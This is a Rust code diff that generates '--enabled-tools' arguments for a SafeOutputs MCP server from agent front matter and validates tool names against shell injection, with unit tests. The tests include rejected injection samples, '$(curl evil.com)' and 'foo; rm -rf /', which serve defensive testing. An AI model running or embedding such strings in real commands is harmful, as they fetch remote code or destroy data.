@@ -671,29 +671,94 @@ pub fn generate_executor_ado_env(write_service_connection: Option<&str>) -> Stri
     }
 }
 
-/// Safe-output names that require write access to ADO.
-const WRITE_REQUIRING_SAFE_OUTPUTS: &[&str] = &[
-    "create-pull-request",
-    "create-work-item",
-    "comment-on-work-item",
-    "update-work-item",
-    "create-wiki-page",
-    "update-wiki-page",
-    "add-pr-comment",
-    "link-work-items",
-    "queue-build",
-    "create-git-tag",
-    "add-build-tag",
-    "create-branch",
-    "update-pr",
-    "upload-attachment",
-    "submit-pr-review",
-    "reply-to-pr-review-comment",
-    "resolve-pr-review-thread",
-];
+/// Returns true if the name contains only ASCII alphanumerics and hyphens.
+/// This value is embedded inline in a shell command, so control characters
+/// (including newlines) and whitespace must be rejected to prevent corruption.
+fn is_safe_tool_name(name: &str) -> bool {
+    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
+}
+
+/// Generate `--enabled-tools` CLI args for the SafeOutputs MCP server.
+///
+/// Derives the tool list from `safe-outputs:` front matter keys plus always-on
+/// diagnostic tools. If `safe-outputs:` is empty, returns an empty string
+/// (all tools enabled for backward compatibility).
+///
+/// Non-MCP keys (like `memory`) are silently skipped — they are handled by the
+/// executor and have no corresponding MCP route.
+///
+/// Tool names are validated to contain only ASCII alphanumerics and hyphens
+/// to prevent shell injection when the args are embedded in bash commands.
+/// Unrecognized tool names emit a compile-time warning and are skipped.
+pub fn generate_enabled_tools_args(front_matter: &FrontMatter) -> String {
+    use crate::tools::{ALL_KNOWN_SAFE_OUTPUTS, ALWAYS_ON_TOOLS, NON_MCP_SAFE_OUTPUT_KEYS};
+    use std::collections::HashSet;
+
+    if front_matter.safe_outputs.is_empty() {
+        return String::new();
+    }
+
+    // `seen` deduplicates across user keys and ALWAYS_ON_TOOLS (e.g. if the user
+    // configures `noop` explicitly, it shouldn't appear twice in the output).
+    let mut seen = HashSet::new();
+    let mut tools: Vec<String> = Vec::new();
+    let mut effective_mcp_tool_count = 0usize;
+    for key in front_matter.safe_outputs.keys() {
+        if !is_safe_tool_name(key) {
+            eprintln!(
+                "Warning: skipping invalid safe-output tool name '{}' (must be ASCII alphanumeric/hyphens only)",
+                key
+            );
+            continue;
+        }
+        if NON_MCP_SAFE_OUTPUT_KEYS.contains(&key.as_str()) {
+            continue;
+        }
+        if !ALL_KNOWN_SAFE_OUTPUTS.contains(&key.as_str()) {
+            eprintln!(
+                "Warning: unrecognized safe-output tool '{}' — skipping (no registered tool matches this name)",
+                key
+            );
+            continue;
+        }
+        effective_mcp_tool_count += 1;
+        if seen.insert(key.clone()) {
+            tools.push(key.clone());
+        }
+    }
+
+    if effective_mcp_tool_count == 0 {
+        // Every user-specified key was either invalid, unrecognized, or non-MCP
+        // (e.g. memory-only). Return empty to keep all tools available (backward compat).
+        return String::new();
+    }
+
+    // Always include diagnostic tools
+    for tool in ALWAYS_ON_TOOLS {
+        let name = tool.to_string();
+        if seen.insert(name.clone()) {
+            tools.push(name);
+        }
+    }
+
+    tools.sort();
+
+    let args = tools
+        .iter()
+        .map(|t| format!("--enabled-tools {}", t))
+        .collect::<Vec<_>>()
+        .join(" ");
+
+    // Trailing space so the args don't concatenate with the next positional
+    // argument when embedded inline in the shell template.
+    // `args` is never empty here because ALWAYS_ON_TOOLS always contributes entries.
+    args + " "
+}
 
 /// Validate that write-requiring safe-outputs have a write service connection configured.
 pub fn validate_write_permissions(front_matter: &FrontMatter) -> Result<()> {
+    use crate::tools::WRITE_REQUIRING_SAFE_OUTPUTS;
+
     let has_write_sc = front_matter
         .permissions
         .as_ref()
@@ -1636,5 +1701,89 @@ mod tests {
             "---\nname: test\ndescription: test\nsafe-outputs:\n  resolve-pr-review-thread:\n    allowed-statuses:\n      - fixed\n      - wont-fix\n---\n"
         ).unwrap();
         assert!(validate_resolve_pr_thread_statuses(&fm).is_ok());
+    }
+
+    // ─── Enabled tools args generation ──────────────────────────────────
+
+    #[test]
+    fn test_generate_enabled_tools_args_empty_safe_outputs() {
+        let (fm, _) = parse_markdown(
+            "---\nname: test\ndescription: test\n---\n"
+        ).unwrap();
+        let args = generate_enabled_tools_args(&fm);
+        assert!(args.is_empty(), "Empty safe-outputs should produce no args");
+    }
+
+    #[test]
+    fn test_generate_enabled_tools_args_with_configured_tools() {
+        let (fm, _) = parse_markdown(
+            "---\nname: test\ndescription: test\nsafe-outputs:\n  create-pull-request:\n    target-branch: main\n  create-work-item:\n    work-item-type: Task\n---\n"
+        ).unwrap();
+        let args = generate_enabled_tools_args(&fm);
+        assert!(args.contains("--enabled-tools create-pull-request"));
+        assert!(args.contains("--enabled-tools create-work-item"));
+        // Always-on tools should also be included
+        assert!(args.contains("--enabled-tools noop"));
+        assert!(args.contains("--enabled-tools missing-data"));
+        assert!(args.contains("--enabled-tools missing-tool"));
+        assert!(args.contains("--enabled-tools report-incomplete"));
+    }
+
+    #[test]
+    fn test_generate_enabled_tools_args_no_duplicates() {
+        // If a diagnostic tool is also in safe-outputs, it shouldn't appear twice
+        let (fm, _) = parse_markdown(
+            "---\nname: test\ndescription: test\nsafe-outputs:\n  noop:\n    max: 5\n---\n"
+        ).unwrap();
+        let args = generate_enabled_tools_args(&fm);
+        let noop_count = args.matches("--enabled-tools noop").count();
+        assert_eq!(noop_count, 1, "noop should appear exactly once");
+    }
+
+    #[test]
+    fn test_is_safe_tool_name() {
+        assert!(is_safe_tool_name("create-pull-request"));
+        assert!(is_safe_tool_name("noop"));
+        assert!(is_safe_tool_name("my-tool-123"));
+        assert!(!is_safe_tool_name(""));
+        assert!(!is_safe_tool_name("$(curl evil.com)"));
+        assert!(!is_safe_tool_name("foo; rm -rf /"));
+        assert!(!is_safe_tool_name("tool name"));
+        assert!(!is_safe_tool_name("tool\ttab"));
+    }
+
+    #[test]
+    fn test_generate_enabled_tools_args_skips_unknown_tool() {
+        // An unrecognized (but safe-formatted) tool name should be skipped.
+        // When no valid MCP tools remain, return empty (all tools available).
+        let (fm, _) = parse_markdown(
+            "---\nname: test\ndescription: test\nsafe-outputs:\n  crate-pull-request:\n    target-branch: main\n---\n"
+        ).unwrap();
+        let args = generate_enabled_tools_args(&fm);
+        assert!(!args.contains("crate-pull-request"), "Unrecognized tool should be skipped");
+        assert!(args.is_empty(), "All-unrecognized safe-outputs should produce no args (all tools available)");
+    }
+
+    #[test]
+    fn test_generate_enabled_tools_args_skips_memory_key() {
+        // `memory` is a non-MCP executor-only key. It must not appear in
+        // --enabled-tools or it would cause real MCP tools to be filtered out.
+        let (fm, _) = parse_markdown(
+            "---\nname: test\ndescription: test\nsafe-outputs:\n  memory:\n    allowed-extensions:\n      - .md\n  create-pull-request:\n    target-branch: main\n---\n"
+        ).unwrap();
+        let args = generate_enabled_tools_args(&fm);
+        assert!(!args.contains("--enabled-tools memory"), "Non-MCP key 'memory' should be skipped");
+        assert!(args.contains("--enabled-tools create-pull-request"), "Real MCP tool should be present");
+    }
+
+    #[test]
+    fn test_generate_enabled_tools_args_memory_only_does_not_filter() {
+        // When `memory` is the only safe-output key, no --enabled-tools args should
+        // be generated so all tools remain available (backward compat).
+        let (fm, _) = parse_markdown(
+            "---\nname: test\ndescription: test\nsafe-outputs:\n  memory:\n    allowed-extensions:\n      - .md\n---\n"
+        ).unwrap();
+        let args = generate_enabled_tools_args(&fm);
+        assert!(args.is_empty(), "memory-only safe-outputs should produce no args (all tools available)");
     }
 }
